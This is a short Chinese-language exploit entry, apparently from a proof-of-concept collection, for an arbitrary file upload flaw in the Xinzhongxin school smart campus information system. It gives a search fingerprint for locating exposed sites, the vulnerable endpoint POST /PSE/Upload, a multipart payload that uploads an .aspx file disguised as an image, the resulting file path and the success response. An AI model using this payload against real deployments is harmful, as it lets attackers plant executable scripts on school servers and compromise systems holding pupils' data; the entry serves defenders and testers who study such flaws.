# 新中新中小学智慧校园信息管理系统PSE存在任意文件上传漏洞

新中新中小学智慧校园信息管理系统 ｜ 文件上传 ｜ —
- **指纹**：`body="/Login/IndexMobi"`
- **请求**：`POST /PSE/Upload HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: image/jpg
123
--00content0boundary00--
上传位置：
/Upload/PrimarySchoolEnrollment/70895ada-146e-4c52-a377-af0fb7b05d57.aspx
```
- **响应特征**：200 “Success”: true